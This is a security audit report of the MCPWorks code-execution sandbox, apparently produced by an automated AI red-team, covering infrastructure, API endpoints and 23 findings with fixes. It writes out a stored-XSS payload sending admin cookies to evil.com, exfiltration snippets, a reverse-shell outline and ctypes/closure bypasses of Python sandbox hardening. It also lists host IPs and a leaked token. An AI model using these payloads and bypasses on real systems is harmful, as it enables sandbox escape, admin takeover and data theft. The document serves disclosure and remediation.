# MCPWorks Sandbox Security Audit

**Date:** 2026-03-06 (Round 1), 2026-03-07 (Rounds 2, 3 & 4), 2026-03-08 (Rounds 5, 6, 7 & 8), 2026-03-09 (Rounds 9, 10 & 11)
**Auditor:** Claude Opus 4.6 (automated red-team via MCP tools)
**Namespace:** `redteam`
**Tier tested:** `builder`

---

## Architecture Overview

The sandbox runs user code inside **nsjail** (Google's security sandbox) within a **Docker Compose** network on a **DigitalOcean** droplet. The execution flow is:

1. `spawn-sandbox.sh` creates a tmpfs workspace, copies `user_code.py`, `input.json`, and `functions/` package
2. nsjail launches with config (`/etc/mcpworks/sandbox.cfg`) + seccomp policy (`/etc/mcpworks/seccomp.policy`)
3. `execute.py` runs inside the jail: reads `.exec_token` (then deletes it), loads env vars from `.sandbox_env.json` (then deletes it), execs user code
4. Supports 3 result patterns: `result = ...`, `output = ...`, or `def main(input_data)`
5. Call tracking via `functions/_registry.py` appended to user code for billing
6. Output limits: 64 KB stdout/stderr, 1 MB total JSON output

---

## Host Infrastructure

| Property | Value |
|----------|-------|
| Cloud Provider | DigitalOcean ("DO-Regular" CPU model) |
| Public IP | `159.203.30.199` |
| CPU | 2x Intel Broadwell vCPUs @ 2.29 GHz |
| RAM | ~4 GB total (host) |
| Kernel | Linux 5.15.0-113-generic (Ubuntu 22.04 build) |
| Container Runtime | containerd with overlayfs (25+ snapshot layers) |
| Python | 3.11.15 (built 2026-03-03, GCC 14.2.0, glibc 2.41) |
| Reverse Proxy | Caddy (via `Via: 1.1 Caddy` header) |
| CDN/DNS | Cloudflare (for `mcpworks.io`), direct for `*.run/create.mcpworks.io` |
| App Platform | DigitalOcean App Platform (for `www.mcpworks.io`, origin `f640094e-...`) |
| API Version | mcpworks v1.26.0 (from MCP initialize response, as of R6) |

---

## Docker Network Topology (`172.18.0.0/16`)

| IP | Service | Port | Notes |
|----|---------|------|-------|
| `172.18.0.1` | Docker Gateway | — | Default route, MAC `92:81:4a:7b:0d:ab` |
| `172.18.0.2` | PostgreSQL | 5432 | 4 persistent connections from API process |
| `172.18.0.3` | Redis | 6379 | 1 persistent connection from API process |
| `172.18.0.4` | Sandbox/API | 8000 | The sandbox host — runs nsjail + FastAPI |
| `172.18.0.5` | Caddy Proxy | 80/443 | Reverse proxy, many connections to :8000 |
| `127.0.0.11` | Docker DNS | 36605 | Embedded DNS resolver |

Network topology was mapped by decoding `/proc/net/tcp` and `/proc/net/arp` from inside the sandbox. Service names are **not** resolvable from jailed code.

---

## Public API Surface

| Endpoint | Domain | Infrastructure |
|----------|--------|----------------|
| Run API | `redteam.run.mcpworks.io` | Direct to DO droplet via Caddy |
| Create API | `redteam.create.mcpworks.io` | Direct to DO droplet via Caddy |
| Marketing site | `www.mcpworks.io` | DigitalOcean App Platform + Cloudflare CDN |

Both API subdomains return: `{"name":"mcpworks API","version":"0.1.0","docs":"disabled"}`

Security headers present: `x-content-type-options: nosniff`, `x-frame-options: DENY`, `referrer-policy: strict-origin-when-cross-origin`

### Discovered API Endpoints (Rounds 3–4)

| Method | Path | Auth | Status | Purpose |
|--------|------|------|--------|---------|
| POST | `/v1/auth/register` | None | 201 | Open user registration |
| POST | `/v1/auth/login` | None | 200/401 | Admin/user login |
| POST | `/v1/auth/refresh` | Token | 200 | Refresh access token (7-day refresh tokens) |
| POST | `/v1/auth/token` | API key | 200 | Exchange API key for access token |
| POST | `/v1/auth/verify-email` | Token | 200/400 | Email verification via PIN |
| POST | `/v1/auth/resend-verification` | Token | 200 | Resend verification PIN (5 max) |
| GET | `/v1/auth/api-keys` | Token | 200 | List API keys (POST only) |
| GET | `/v1/users/me` | Token | 200/403 | User profile (requires verification) |
| GET/POST | `/v1/namespaces` | Token | 200/201 | List/create namespaces |
| GET/DELETE | `/v1/namespaces/{name}` | Token | 200 | Get/delete namespace |
| GET/POST | `/v1/namespaces/{name}/services` | Token | 200/201 | List/create services |
| GET/POST | `/v1/mcp` | Varies | 200 | MCP protocol endpoint (SSE transport) |
| GET | `/admin` | **None** | 200 | Admin SPA (unauthenticated) |
| GET | `/v1/admin/stats` | Admin | 200 | Platform statistics |
| GET | `/v1/admin/stats/leaderboard` | Admin | 200 | Usage leaderboard |
| GET | `/v1/admin/users` | Admin | 200 | List all users |
| POST | `/v1/admin/users/{id}/approve` | Admin | 200 | Approve user |
| POST | `/v1/admin/users/{id}/reject` | Admin | 200 | Reject user |
| POST | `/v1/admin/users/{id}/suspend` | Admin | 200 | Suspend user |
| POST | `/v1/admin/users/{id}/unsuspend` | Admin | 200 | Unsuspend user |
| POST | `/v1/admin/users/{id}/impersonate` | Admin | 200 | Impersonate user |
| POST | `/v1/admin/users/{id}/tier-override` | Admin | 200 | Override tier |
| DELETE | `/v1/admin/users/{id}` | Admin | 200 | Delete user account |
| GET | `/v1/admin/namespaces` | Admin | 200 | List all namespaces |
| POST | `/v1/admin/namespaces/{name}/share` | Admin | 200 | Share namespace |
| GET | `/v1/admin/services` | Admin | 200 | List all services |
| GET | `/v1/admin/functions` | Admin | 200 | List all functions |
| GET | `/v1/admin/executions` | Admin | 200 | Execution history |
| GET | `/v1/admin/pending-approvals` | Admin | 200 | Pending user approvals |

### Authentication Details (Rounds 3–4)

| Property | Value |
|----------|-------|
| Algorithm | ES256 (ECDSA P-256) — only accepted algorithm |
| Key rotation | No `kid` in JWT header — single signing key, no rotation |
| Access token expiry | 1 hour |
| Refresh token expiry | 7 days |
| Token issuer | `https://api.mcpworks.io` |
| Token audience | `https://mcpworks.io` |
| Scopes | `read`, `write`, `execute` |
| alg=none | Rejected ("alg value is not allowed") |
| HS256/RS256/etc | Rejected ("alg value is not allowed") |
| Login error enumeration | Uniform ("Invalid email or password") |
| Registration rate limit | 3 per hour per IP (added after Round 3) |
| Login rate limit | **Not observed** (5 requests in 0.2s all processed) |
| PIN verification rate limit | 20 per minute (6-digit PIN, ~35 days to brute-force) |
| API key format | Prefixes `mcp_`, `mw_`, `mcpw_`, `mk_` accepted; `sk-`, `mcpworks_` rejected as invalid format |

---

## nsjail Sandbox Isolation

| Control | Configuration |
|---------|--------------|
| Namespaces | user, mount, PID, IPC, UTS, cgroup (**net is shared**) |
| UID/GID | 65534:65534 (`nobody`) |
| Seccomp | Mode 2 (strict filter), 1 policy file |
| NoNewPrivs | Enabled |
| Capabilities | All dropped (Inh/Prm/Eff/Bnd/Amb = 0x0) |
| Root FS | tmpfs, 16 KB, read-only |
| Max CPU time | 30s (hard limit via rlimit) |
| Max address space | 256 MB |
| Max open files | 32 |
| Max processes | 32 |
| Max file size | 10 MB |

### Seccomp Blocked Syscalls (Rounds 3–9)

| Syscall | Result | Notes |
|---------|--------|-------|
| `symlink()` | **SIGSYS** — process killed | |
| `mknod()` | **SIGSYS** — process killed | |
| `mount()` | **SIGSYS** — process killed | |
| `ptrace()` | **SIGSYS** — process killed | |
| `fork()` | **SIGSYS** — process killed | |
| `bind()` | ~~SIGSYS~~ → **ALLOWED (R7)** | Policy changed: bind allowed, listen blocked |
| `listen()` | **SIGSYS** — process killed (R7) | Replaced bind() block — more targeted |
| `execve()` | **OSError:9:noexec** — blocked (R9) | _posixsubprocess.fork_exec forks but cannot exec any binary |
| `mmap(PROT_EXEC)` | **SIGSEGV** — process killed | |

---

## Tier Resource Limits

| Tier | Timeout | Memory | PIDs | tmpfs |
|------|---------|--------|------|-------|
| free | 10s | 128 MB | 16 | 5 MB |
| **builder** | **30s** | **256 MB** | **32** | **20 MB** |
| pro | 90s | 512 MB | 64 | 50 MB |
| enterprise | 300s | 2048 MB | 128 | 200 MB |

---

## Aggregate cgroup Limits (all sandboxes combined)

| Resource | Limit | Rationale |
|----------|-------|-----------|
| Memory | 3 GB | Leaves 1 GB for OS + API + DB + Redis on 4 GB host |
| PIDs | 200 | Total process limit across all concurrent sandboxes |
| CPU | 200% (2 cores) | Full host CPU allocation |

---

## Filesystem Mount Map

| Inside Jail | Source | Mode |
|-------------|--------|------|
| `/usr`, `/lib`, `/lib64`, `/bin` | Host overlayfs | read-only |
| `/opt/mcpworks/site-packages` | `sandbox-root/site-packages` | read-only |
| `/opt/mcpworks/bin` | Host bin dir | read-only |
| `/etc/passwd`, `/etc/group`, `/etc/hosts`, `/etc/resolv.conf` | `/opt/mcpworks/rootfs/` | read-only |
| `/etc/ssl/certs`, `/usr/share/ca-certificates` | Host (optional) | read-only |
| `/dev` | tmpfs (`null`, `zero`, `random`, `urandom` only) | minimal |
| `/proc` | procfs | read-only |
| `/proc/cpuinfo` | `.fake_cpuinfo` (bind-mount override) | read-only, sanitized |
| `/proc/meminfo` | `.fake_meminfo` (bind-mount override) | read-only, sanitized |
| `/proc/version` | `.fake_version` (bind-mount override) | read-only, sanitized |
| `/tmp` | tmpfs | **read-write** |
| `/sandbox` | tmpfs workspace (`ws-<exec_id>`) | **read-write** |

---

## Environment Variables (inside jail)

Only 4 variables are present:

| Variable | Value |
|----------|-------|
| `HOME` | `/tmp` |
| `LANG` | `C.UTF-8` |
| `PYTHONPATH` | `/opt/mcpworks/site-packages:/sandbox` |
| `SSL_CERT_FILE` | `/usr/lib/ssl/cert.pem` |

User-provided env vars are injected via `.sandbox_env.json` (file-based, deleted after read).

---

## Findings

### FINDING-01: Stored XSS via Registration Name Field (Critical)

**Issue:** The `/v1/auth/register` endpoint accepts arbitrary HTML/JavaScript in the `name` field and stores it without sanitization. The admin panel renders user data using template literals injected via `innerHTML` (no `esc()` function was found, no DOMPurify, no `createElement` usage). When an admin views the pending approvals or user list, the stored XSS payload executes in their browser.

**Evidence:**
```
POST /v1/auth/register
{"email": "xss-test@test.com", "password": "TestPass123!",
 "name": "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"}

Response: 201 Created
User name stored as-is: "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
```
- Admin panel uses no client-side sanitization (no DOMPurify, no innerHTML=0, no textContent, no createElement)
- No `Content-Security-Policy` header is set on the admin page
- The admin panel has functions for `impersonateUser`, `deleteAccount`, `suspendUser` — all callable via stolen admin token

**Impact:** An attacker can register with an XSS payload as their name, which executes when any admin views the user list or pending approvals. This could steal admin JWT tokens, impersonate users, delete accounts, or take over the platform.

**Attack chain:**
1. Register from sandbox code with XSS in name field
2. Admin reviews pending approvals → XSS fires
3. Payload steals admin Bearer token
4. Attacker uses admin token to impersonate any user, access all data, or delete accounts

**Recommendation:**
1. Sanitize all user input server-side before storage (strip HTML tags from name)
2. Add `Content-Security-Policy` header to admin panel (at minimum `script-src 'self'`)
3. Use `textContent` or DOMPurify in the admin JS instead of template literal injection
4. Mark auth cookies/tokens as `HttpOnly` and `SameSite=Strict`

### FINDING-02: Sandbox Port Hijacking — Bind to Service Ports (Critical)

**Issue:** Sandboxed code can bind TCP listeners on ports 80, 443, 5432, 6379, 8080, and 9090 on `0.0.0.0`. Because the sandbox shares the host's network namespace (`clone_newnet:false`), these listeners are reachable on the Docker network. Only port 8000 (the API) is already in use.

**Evidence (Round 4):**
```
socket.bind(('0.0.0.0', 80))   → SUCCESS
socket.bind(('0.0.0.0', 443))  → SUCCESS
socket.bind(('0.0.0.0', 5432)) → SUCCESS  (PostgreSQL port)
socket.bind(('0.0.0.0', 6379)) → SUCCESS  (Redis port)
socket.bind(('0.0.0.0', 8080)) → SUCCESS
socket.bind(('0.0.0.0', 9090)) → SUCCESS
socket.bind(('0.0.0.0', 8000)) → BLOCKED  (Address already in use)
```

**Impact:**
- **Service impersonation:** A sandbox execution could bind to port 5432 or 6379 and impersonate PostgreSQL or Redis. If the API process temporarily loses its connection and reconnects, it could connect to the attacker's listener instead.
- **Traffic interception:** If any internal process makes connections to `localhost:80` or `localhost:443`, the sandbox listener would receive them.
- **Cross-sandbox attacks:** If sandbox executions make internal HTTP calls to services on these ports, a concurrent malicious sandbox could intercept them.
- **Persistent listener:** The sandbox runs for up to 30 seconds (builder tier). During that window, the listener is active on the host's network interface.

**Recommendation:**
1. Enable `clone_newnet:true` in nsjail to give each sandbox its own network namespace
2. If shared network is required, add seccomp rules to block `bind()` on privileged ports (< 1024) and known service ports
3. Alternatively, use iptables owner-match rules to restrict port binding by UID 65534

### FINDING-03: Execution Token Leaked to User Code (High)

**Issue:** The `_exec_token` is accessible to user code via Python globals. While `execute.py` reads the token from `.exec_token` file and deletes the file, it stores the value in `exec_globals["_exec_token"]` which is the same namespace where user code runs.

**Evidence (Round 4):**
```python
# From inside sandbox user code:
globals().get('_exec_token')
→ "OG5G93o7dB0k3P_sbVtUXOJrjOcbTxSTGpOhh2T0e0o"
```
The token is a 32-byte base64url-encoded value, injected via `exec_globals = {..., "_exec_token": exec_token}` in `execute.py`.

**Impact:** If the exec token is used for any authorization, authentication, or billing purpose beyond the sandbox, user code can capture and exfiltrate it. Since outbound internet access is available, the token can be sent to an external server.

**Recommendation:** Remove `_exec_token` from `exec_globals` before executing user code, or use a separate namespace/scope for the wrapper's internal variables. For example:
```python
exec_globals = {"input_data": input_data, "__name__": "__main__"}
# Do NOT pass _exec_token into exec_globals
```

### FINDING-04: Billing Registry Monkey-Patchable (High)

**Issue:** User code can import and modify the billing call-tracking module (`functions._registry`). The `_get_call_log` function can be replaced via monkey-patching, and the `_call_log` list can be manipulated directly.

**Evidence (Round 4):**
```python
# Inject 1000 fake "expensive" function calls into billing:
from functions._registry import _track_call
for i in range(1000):
    _track_call(f"fake-expensive-function-{i}")

# Or completely replace the logging function:
import functions._registry as reg
reg._get_call_log = lambda: ["premium-function"] * 10000
```

**Impact:**
- **Billing fraud:** Inflate another user's bill by injecting calls to expensive functions
- **Billing evasion:** Replace `_get_call_log` with a function that returns an empty list
- **Data integrity:** The billing data written to stderr by the appended wrapper code becomes unreliable

**Recommendation:**
1. Move billing tracking out of the user-accessible Python namespace
2. Use a separate process or IPC mechanism for call tracking that user code cannot modify
3. At minimum, freeze the registry module before executing user code (e.g., make `_call_log` a C-level immutable or track calls in a subprocess)

### FINDING-05: Unauthenticated Admin Panel with Full API Surface Exposure (High)

**Issue:** The `/admin` endpoint serves a full-featured admin SPA (60 KB of HTML/JS) without any server-side authentication gate. The panel exposes the complete admin API surface, authentication flow, and data model.

**Evidence:**
- `GET /admin` returns 200 with full HTML/JS from both `redteam.run.mcpworks.io` and `redteam.create.mcpworks.io`
- Exposed admin functions: `impersonateUser`, `deleteAccount`, `suspendUser`, `unsuspendUser`, `setTierOverride`, `approveUser`, `rejectUser`, and more
- Authentication is client-side only via `doLogin()` calling `/v1/auth/login`

**Impact:** An attacker gains full knowledge of the admin API surface, enabling targeted attacks. Combined with FINDING-01 (stored XSS), an attacker can chain: register with XSS → steal admin token → use any admin endpoint.

**Recommendation:**
1. Gate `/admin` behind server-side authentication (return 401/403 for unauthenticated requests)
2. Consider IP allowlisting for admin endpoints
3. Separate the admin API onto a different port/domain not publicly exposed

### FINDING-06: No Namespace Name Reservation — Subdomain Takeover Risk (High)

**Issue:** Any registered user can create namespaces with sensitive names like `admin`, `api`, `www`, `internal`. Each namespace generates wildcard subdomains (`{name}.run.mcpworks.io`, `{name}.create.mcpworks.io`).

**Evidence:**
```
POST /v1/namespaces {"name": "admin"}  → 201 → admin.run.mcpworks.io
POST /v1/namespaces {"name": "api"}    → 201 → api.run.mcpworks.io
POST /v1/namespaces {"name": "www"}    → 201 → www.run.mcpworks.io
POST /v1/namespaces {"name": "internal"} → 201 → internal.run.mcpworks.io
```
All created successfully (cleaned up during audit). Only `mcpworks` was reserved (409 conflict).

**Impact:**
- **Brand confusion:** `admin.run.mcpworks.io` looks like an official admin endpoint
- **Phishing:** Users could be tricked into authenticating against attacker-controlled namespaces
- **Routing conflicts:** If Caddy routes by subdomain, these names could intercept traffic intended for platform services

**Recommendation:** Maintain a reserved namespace list: `admin`, `api`, `www`, `internal`, `system`, `root`, `support`, `help`, `billing`, `status`, `docs`, `app`, `dashboard`, `console`, etc.

### FINDING-07: CORS Misconfiguration — Credentials with Missing Origin Validation (High)

**Issue:** The API returns `Access-Control-Allow-Credentials: true` for requests from any origin, without setting `Access-Control-Allow-Origin`. The preflight response allows all methods and the `Authorization` header.

**Evidence:**
```
OPTIONS /v1/admin/stats
Origin: https://evil.com
→ access-control-allow-credentials: true
→ access-control-allow-headers: Authorization
→ access-control-allow-methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
→ access-control-max-age: 600

GET /v1/namespaces (with auth token)
Origin: https://evil.com
→ access-control-allow-credentials: true
```

**Impact:** If `Access-Control-Allow-Origin` is dynamically set to reflect the request origin (a common misconfiguration), any malicious website could make authenticated API requests on behalf of a logged-in admin. Combined with the XSS finding, this creates multiple paths to admin token theft.

**Recommendation:** Restrict CORS to specific allowed origins (e.g., `https://mcpworks.io`, `https://www.mcpworks.io`). Never reflect arbitrary origins with `allow-credentials: true`.

### FINDING-08: Shared Network Namespace with /proc/net Leakage (Medium)

**Issue:** nsjail is configured with `clone_newnet:false`. The sandbox shares the host's network namespace. While iptables/firewall rules now block direct connections to internal services, `/proc/net/tcp` still exposes the full TCP connection table. Combined with FINDING-02, the shared network also enables port hijacking.

**Evidence:**
- `/proc/net/tcp` reveals all host connections (Postgres, Redis, proxy, external services)
- `/proc/net/arp` reveals MAC addresses of all Docker containers
- `/proc/net/route` reveals network topology and gateway
- `/proc/net/unix` reveals 6 Unix domain sockets (Round 4)
- Direct TCP connections to internal IPs now timeout (firewall DROP rules)

**Recommendation:** Enable `clone_newnet:true` in nsjail. This would fix both the information leakage and the port hijacking issue (FINDING-02) in one change.

### FINDING-09: Open Registration from Sandbox Code (Medium)

**Issue:** Sandboxed code can call the public API to register new accounts and interact with the platform. While email verification is now enforced for write operations (fixed after Round 3), registration itself still works.

**Evidence:**
```python
# From inside sandbox:
httpx.post('https://redteam.run.mcpworks.io/v1/auth/register', json={...}) → 201
```

**Impact:** A malicious function could register accounts with XSS payloads (FINDING-01), which only requires registration — not verification. Rate limiting (3/hour) slows but doesn't prevent this.

**Recommendation:** Consider egress filtering to block sandbox traffic to `*.mcpworks.io` domains, or add CAPTCHA on registration.

### FINDING-10: Missing Login Rate Limiting (Medium)

**Issue:** The `/v1/auth/login` endpoint does not appear to have rate limiting. Five consecutive failed login attempts completed in 0.2 seconds with no throttling or lockout. Other endpoints like `/v1/auth/api-key` do have rate limiting (20 req/min).

**Evidence:**
```
5 failed login attempts in 0.219 seconds — all returned 401 immediately
No 429 responses, no progressive delays, no account lockout
```

**Impact:** Enables brute-force and credential stuffing attacks against admin and user accounts.

**Recommendation:** Add rate limiting (e.g., 5 attempts per minute per IP/email), progressive delays, and account lockout after repeated failures.

### FINDING-11: /proc Partial Remediation — Gaps Remain (Low)

**Issue:** Since Round 1, fake bind-mounts were added for `/proc/cpuinfo`, `/proc/meminfo`, and `/proc/version`. Other `/proc` entries still leak information.

**Remediated:**
| File | Now shows |
|------|-----------|
| `/proc/cpuinfo` | `vendor_id: MCPWorks`, `model name: Virtual CPU`, 1 core |
| `/proc/meminfo` | `MemTotal: 262144 kB` (matches tier limit) |
| `/proc/version` | `Linux version 0.0.0 (sandbox)` |

**Still exposed:**
| File | Leaks |
|------|-------|
| `/proc/net/tcp` | Full TCP connection table with IPs and ports |
| `/proc/net/arp` | Container MAC addresses and IPs |
| `/proc/net/unix` | Unix domain socket inodes |
| `/proc/self/mountinfo` | Complete containerd overlay snapshot paths |
| `/proc/self/maps` | Full memory layout including library paths |

### FINDING-12: API Key Format Disclosure via Error Messages (Low)

**Issue:** The MCP endpoint returns different error messages for invalid key formats vs. invalid keys, allowing an attacker to enumerate valid API key prefixes.

**Evidence (Round 4):**
| Key prefix | Error message | Meaning |
|------------|---------------|---------|
| `mcp_*` | "Invalid API key" | Valid format, wrong key |
| `mw_*` | "Invalid API key" | Valid format, wrong key |
| `mcpw_*` | "Invalid API key" | Valid format, wrong key |
| `mk_*` | "Invalid API key" | Valid format, wrong key |
| `sk-*` | "Invalid API key format" | Invalid format |
| `mcpworks_*` | "Invalid API key format" | Invalid format |
| (no auth) | "Missing or invalid Authorization header" | No auth |

**Impact:** Reveals internal API key naming conventions, slightly reducing the search space for brute-force attacks.

**Recommendation:** Use a uniform error message for all invalid API keys regardless of format.

### FINDING-13: Namespace Deletion Reveals Recovery Window (Informational)

**Issue:** When a namespace is deleted, the API response reveals a 30-day recovery window and exact timestamps.

**Evidence:**
```json
{"name": "admin", "deleted_at": "2026-03-07T07:15:58.409367+00:00",
 "recovery_until": "2026-04-06T07:15:58.409367+00:00",
 "affected_services": 0, "affected_functions": 0, "affected_api_keys": 0}
```

**Impact:** Low — reveals recovery policy.

### FINDING-14: MCP Protocol Accessible Without Auth (Informational)

**Issue:** The `/mcp` endpoint responds to MCP protocol requests and returns server info without authentication.

**Evidence:**
```json
POST /mcp (with Accept: text/event-stream)
→ SSE response with: serverInfo: {"name": "mcpworks", "version": "1.26.0"}
```

**Impact:** Reveals server version. The endpoint requires API key auth for actual tool operations.

### FINDING-15: User Code Wrapper / Billing Code Visible (Informational)

**Issue:** The billing/call-tracking code appended to `user_code.py` is visible to the executed code. See FINDING-04 for the monkey-patching risk this creates.

### FINDING-16: Outbound Internet Access — Data Exfiltration Vector (Critical — Accepted Risk)

**Issue:** Sandboxed code has full outbound HTTP/HTTPS access to the internet on paid tiers (builder/pro/enterprise). Data can be exfiltrated via HTTP POST, DNS tunneling, or persistent TCP connections. Free tier (UID 65534) has outbound blocked by iptables.

**Product context:** Outbound internet is an **intentional product feature** for paid tiers. Functions need to call external APIs, fetch data, use webhooks, etc. This cannot be blocked without breaking the platform's core value proposition.

**Evidence (Round 5, confirmed R9-R11):**
```python
# HTTP POST exfiltration — CONFIRMED
urllib.request.urlopen(Request('https://httpbin.org/post', data=base64_encoded_data))
→ 200 OK, data echoed back. Server IP: 159.203.30.199

# DNS exfiltration — CONFIRMED
socket.getaddrinfo('exfil-test.example.com', 80)
→ Resolves (attacker DNS server would log the subdomain data)

# Remote code download — CONFIRMED
urllib.request.urlopen('https://httpbin.org/robots.txt')
→ Downloaded arbitrary content

# Persistent outbound TCP — CONFIRMED
socket.connect(('httpbin.org', 443))
→ Connected, connection held open

# curl/subprocess — BLOCKED R9 (execve blocked by seccomp)
```

**Impact:**
- **Data exfiltration:** Any data readable in the sandbox can be sent to an attacker-controlled server (primary remaining vector when combined with F-37)
- **Supply chain attack:** Malicious function code could download and execute additional payloads at runtime
- ~~**Reverse shell:**~~ Blocked R9 — execve blocked by seccomp
- ~~**C2 channel:**~~ Blocked R9 — no subprocess/shell access

**Mitigation (since blocking is not possible):**
1. **Reduce what can be read** — bind-mount empty files over sensitive `/proc` entries so there's less to exfiltrate
2. **`clone_newnet:true` with veth + NAT** — outbound still works but `/proc/net/*` shows only the sandbox's own namespace
3. **Egress monitoring** — log outbound connection metadata for anomaly detection
4. **Account trust** — paid tier accounts require approval; this is the primary gate against malicious actors
5. **Per-function audit** — consider code review or static analysis for published functions

### FINDING-17: Stack Frame Traversal — Execute.py Internals Accessible (High)

**Issue:** User code can use `sys._getframe()` to walk the call stack into `execute.py`'s `run()` function. This exposes all local variables including `old_stdout`, `old_stderr`, `exec_globals` (with full Python builtins), and the `_write_output` function reference.

**Evidence (Round 5):**
```python
frame = sys._getframe(0).f_back  # execute.py's run() frame
run_locals = frame.f_locals

# Accessible variables:
# - old_stdout / old_stderr (real I/O objects)
# - exec_globals (writable dict with full builtins)
# - code (user source code string)
# - captured_stdout / captured_stderr (StringIO objects)
# - success, error, error_type, result (output control variables)

# exec_globals contains ALL builtins:
exec_globals['__builtins__']['eval']    → available
exec_globals['__builtins__']['exec']    → available
exec_globals['__builtins__']['compile'] → available
exec_globals['__builtins__']['open']    → available

# exec_globals is WRITABLE:
exec_globals['__injected__'] = True  → SUCCESS

# _write_output function accessible from module frame:
module_frame = frame.f_back
module_frame.f_locals['_write_output']  → <function>
```

**Impact:**
- Attacker can read the actual stdout/stderr objects to bypass output capture
- Full builtins available even if the sandbox tried to restrict them
- Can potentially modify `success`/`error`/`result` variables to manipulate output
- `_write_output` function can be called directly or replaced

**Recommendation:**
1. Restrict `sys._getframe` by removing it from the exec namespace or monkey-patching `sys` before executing user code
2. Consider running user code in a more isolated manner (e.g., subprocess with separate Python process)
3. At minimum, clear sensitive locals before calling `exec()` and use a minimal builtins dict

### FINDING-18: Subprocess and Shell Access with 567 Available Binaries (High)

**Issue:** `subprocess.run()` works inside the sandbox. `/bin/sh` and `/bin/dash` are available and functional. The sandbox contains 567 binaries including `curl`, `apt`, `cp`, `tar`, and other powerful tools.

**Evidence (Round 5):**
```python
subprocess.run(['id'], capture_output=True)
→ "uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)"

subprocess.run(['/bin/sh', '-c', 'echo SHELL_WORKS'], capture_output=True)
→ "SHELL_WORKS"

subprocess.run(['/bin/dash', '-c', 'echo SHELL_WORKS'], capture_output=True)
→ "SHELL_WORKS"

# 567 total binaries across /bin, /usr/bin, /usr/local/bin
# Including: curl, apt, cp, tar, dd, base64, python3
```

**Impact:** Combined with outbound internet access (FINDING-16), this enables:
- **Reverse shell:** `subprocess.Popen(['/bin/sh', '-i'], stdin=socket, stdout=socket, stderr=socket)`
- **Tool installation:** `apt` could potentially install additional attack tools
- **Binary exploitation:** Native binaries can be used for attacks that Python alone cannot perform
- **ctypes + dup2:** `libc.dup2()` available for file descriptor manipulation (reverse shell fd redirection)

**Recommendation:**
1. Minimize the filesystem — remove all unnecessary binaries from the sandbox overlay
2. At minimum, remove `curl`, `wget`, `apt`, `apt-get`, shells (keep only `/bin/sh` if needed)
3. Consider using `seccomp` to block `execve()` for non-Python binaries

### FINDING-19: Signal Handler Override — Can Resist Graceful Termination (Medium)

**Issue:** User code can register signal handlers for SIGTERM, SIGINT, SIGALRM, and SIGUSR1, effectively ignoring these signals. The `signal.alarm()` timer can be overridden to 300 seconds.

**Evidence (Round 5):**
```python
signal.signal(signal.SIGTERM, lambda s, f: None)  → SUCCESS (can ignore SIGTERM)
signal.signal(signal.SIGINT, lambda s, f: None)   → SUCCESS (can ignore SIGINT)
signal.signal(signal.SIGALRM, lambda s, f: None)  → SUCCESS (can ignore SIGALRM)

signal.alarm(300)  → SUCCESS (was 0, set to 300 seconds)
signal.setitimer(signal.ITIMER_REAL, 300)  → SUCCESS (old value: 0.0)
```

**Impact:** If the platform uses SIGTERM for graceful shutdown of sandbox processes, malicious code can ignore it and continue running. The nsjail hard 30-second wall-clock limit (via `time_limit:30`) would still apply, but this could interfere with cleanup operations.

**Recommendation:**
1. Rely on nsjail's `time_limit` (SIGKILL after timeout) rather than graceful signals
2. Consider blocking `signal.signal()` for SIGTERM via seccomp or by removing the `signal` module from the sandbox

### FINDING-20: sys.modules Writable — Module Cache Poisoning (Medium)

**Issue:** `sys.modules` is fully writable. User code can replace any cached Python module with a trojanized version within the same execution.

**Evidence (Round 5):**
```python
import types
fake_module = types.ModuleType('json')
sys.modules['test_module'] = fake_module  → SUCCESS
# sys.modules is writable — any module can be replaced
```

**Impact:** While the workspace is ephemeral (no cross-execution persistence — confirmed), within a single execution an attacker could:
- Replace the `json` module to intercept `execute.py`'s output serialization
- Replace the `os` module to hook file operations
- Interfere with the billing wrapper's imports

**Recommendation:** Freeze `sys.modules` or use `importlib` hooks to prevent modification after sandbox initialization.

### FINDING-21: /proc/self/mem Readable (Low)

**Issue:** `/proc/self/mem` can be opened for reading. While direct heap scanning returned I/O errors (ptrace-equivalent access blocked), the file handle itself is obtainable.

**Evidence (Round 5):**
```python
open('/proc/self/mem', 'rb')  → SUCCESS (file opens)
mem.seek(heap_start); mem.read(65536)  → IOError (actual read blocked)
```

**Impact:** Low — the read fails at the data access level. Combined with `/proc/self/maps` (which IS fully readable, showing 43 mapped regions including heap and stack addresses), this could potentially be exploited if access controls change.

### FINDING-22: Python-Level Sandbox Restrictions Fully Bypassable via ctypes (Critical)

**Issue:** Between Rounds 5→6, a comprehensive `_harden_sandbox()` function was added to `execute.py` to fix findings F-17 through F-20 and F-08. This function replaces `sys._getframe`, `signal.signal`, `os.system`, `os.popen`, `os.exec*`, `builtins.open`, the `subprocess` module, and freezes `sys.modules`. **Every single restriction can be bypassed** through closure extraction, `os.open()`, `ctypes`, or `dict.__setitem__`.

**Evidence (Round 6):**

| Restriction | Bypass Method |
|-------------|--------------|
| `sys._getframe` depth limit | `sys._getframe.__closure__[0].cell_contents` recovers `_real_getframe` |
| `builtins.open` /proc block | `builtins.open.__closure__[2].cell_contents` recovers `_real_open` |
| `builtins.open` (alt bypass) | `os.open()` + `os.read()` — not restricted |
| `builtins.open` (alt bypass 2) | `ctypes.CDLL('libc.so.6').system(b'cat /proc/net/tcp > /tmp/out')` |
| `subprocess` module fake | `ctypes.CDLL('libc.so.6').system()` — ran `id`, `whoami`, `uname -a` |
| `os.system` / `os.popen` block | `ctypes.CDLL('libc.so.6').system()` |
| `signal.signal` block | `signal.signal.__closure__[0].cell_contents` recovers `_real_signal` |
| `_FrozenModules` | `dict.__setitem__(sys.modules, key, value)` — parent class bypass |

**Impact:** `_harden_sandbox()` provides zero effective security against an attacker familiar with Python internals. The only real security boundary is nsjail + seccomp + network firewall.

**Recommendation:**
1. Accept that in-process Python sandboxing is fundamentally broken — do not rely on it
2. **Remove `ctypes` from the sandbox** — most impactful single change
3. Remove `os.open` / `os.read` if not needed
4. Consider running user code in a separate subprocess with restricted imports
5. Keep `_harden_sandbox()` for defense-in-depth but do not treat it as a security boundary

### FINDING-23: /proc/sys Leaks Host Information (Low)

**Evidence (Round 6):**

| Parameter | Value |
|-----------|-------|
| `boot_id` | `3cf680aa-b03f-4e32-b285-ef8200dd4e0d` |
| `core_pattern` | `\|/usr/share/apport/apport ...` (reveals Ubuntu + apport) |
| `ip_forward` | `1` (Docker forwarding) |
| `uptime` | 25 days |
